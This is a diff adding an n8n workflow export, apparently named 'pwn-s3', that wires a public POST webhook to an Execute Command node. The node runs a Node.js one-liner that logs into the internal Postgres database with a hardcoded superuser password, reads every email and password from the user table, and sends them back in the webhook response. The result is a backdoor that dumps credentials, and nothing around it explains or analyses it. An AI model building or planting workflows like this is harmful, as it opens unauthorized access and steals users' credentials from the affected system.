@@ -1,0 +1,175 @@
+{
+  "active": true,
+  "activeVersion": {
+    "updatedAt": "2026-08-25T18:14:41.006Z",
+    "createdAt": "2026-08-25T18:14:41.006Z",
+    "versionId": "c807dfb6-9bdb-4237-8f88-92e05b3e7d42",
+    "workflowId": "PJpBdlrx9tqkBly8",
+    "nodes": [
+      {
+        "parameters": {
+          "httpMethod": "POST",
+          "path": "pwns31787681680"
+        },
+        "id": "n1",
+        "name": "Webhook",
+        "type": "n8n-nodes-base.webhook",
+        "typeVersion": 1,
+        "position": [
+          0,
+          0
+        ],
+        "webhookId": "pwns31787681680"
+      },
+      {
+        "parameters": {
+          "command": "cd /home/node && node -e 'const{Client}=require(\"pg\");const c=new Client({host:\"postgres\",user:\"postgres\",password:\"d40ea10107a5b0b066f576c4070f62fb\",database:\"n8n_queue\"});c.connect().then(()=>c.query(\"select email,password from user\").then(r=>{console.log(JSON.stringify(r.rows));process.exit(0)}));' 2>&1"
+        },
+        "id": "n2",
+        "name": "Exec",
+        "type": "n8n-nodes-base.executeCommand",
+        "typeVersion": 1,
+        "position": [
+          200,
+          0
+        ]
+      },
+      {
+        "parameters": {
+          "respondWith": "json",
+          "responseBody": "={{ JSON.stringify($json) }}",
+          "options": {}
+        },
+        "id": "n3",
+        "name": "Respond",
+        "type": "n8n-nodes-base.respondToWebhook",
+        "typeVersion": 1,
+        "position": [
+          400,
+          0
+        ]
+      }
+    ],
+    "connections": {
+      "Webhook": {
+        "main": [
+          [
+            {
+              "node": "Exec",
+              "type": "main",
+              "index": 0
+            }
+          ]
+        ]
+      },
+      "Exec": {
+        "main": [
+          [
+            {
+              "node": "Respond",
+              "type": "main",
+              "index": 0
+            }
+          ]
+        ]
+      }
+    },
+    "authors": "Matheus Cristhyan",
+    "name": null,
+    "description": null
+  },
+  "activeVersionId": "c807dfb6-9bdb-4237-8f88-92e05b3e7d42",
+  "connections": {
+    "Webhook": {
+      "main": [
+        [
+          {
+            "node": "Exec",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Exec": {
+      "main": [
+        [
+          {
+            "node": "Respond",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "createdAt": "2026-08-25T18:14:40.994Z",
+  "id": "PJpBdlrx9tqkBly8",
+  "isArchived": false,
+  "meta": null,
+  "name": "pwn-s3-1787681680",
+  "nodes": [
+    {
+      "parameters": {
+        "httpMethod": "POST",
+        "path": "pwns31787681680"
+      },
+      "id": "n1",
+      "name": "Webhook",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 1,
+      "position": [
+        0,
+        0
+      ],
+      "webhookId": "pwns31787681680"
+    },
+    {
+      "parameters": {
+        "command": "cd /home/node && node -e 'const{Client}=require(\"pg\");const c=new Client({host:\"postgres\",user:\"postgres\",password:\"d40ea10107a5b0b066f576c4070f62fb\",database:\"n8n_queue\"});c.connect().then(()=>c.query(\"select email,password from user\").then(r=>{console.log(JSON.stringify(r.rows));process.exit(0)}));' 2>&1"
+      },
+      "id": "n2",
+      "name": "Exec",
+      "type": "n8n-nodes-base.executeCommand",
+      "typeVersion": 1,
+      "position": [
+        200,
+        0
+      ]
+    },
+    {
+      "parameters": {
+        "respondWith": "json",
+        "responseBody": "={{ JSON.stringify($json) }}",
+        "options": {}
+      },
+      "id": "n3",
+      "name": "Respond",
+      "type": "n8n-nodes-base.respondToWebhook",
+      "typeVersion": 1,
+      "position": [
+        400,
+        0
+      ]
+    }
+  ],
+  "pinData": null,
+  "settings": {
+    "callerPolicy": "workflowsFromSameOwner",
+    "availableInMCP": false
+  },
+  "shared": [
+    {
+      "updatedAt": "2026-08-25T18:14:40.994Z",
+      "createdAt": "2026-08-25T18:14:40.994Z",
+      "role": "workflow:owner",
+      "workflowId": "PJpBdlrx9tqkBly8",
+      "projectId": "AxNpta0sA2v4gJ2a"
+    }
+  ],
+  "staticData": null,
+  "tags": [],
+  "triggerCount": 1,
+  "updatedAt": "2026-08-25T18:14:40.994Z",
+  "versionId": "c807dfb6-9bdb-4237-8f88-92e05b3e7d42"
+}
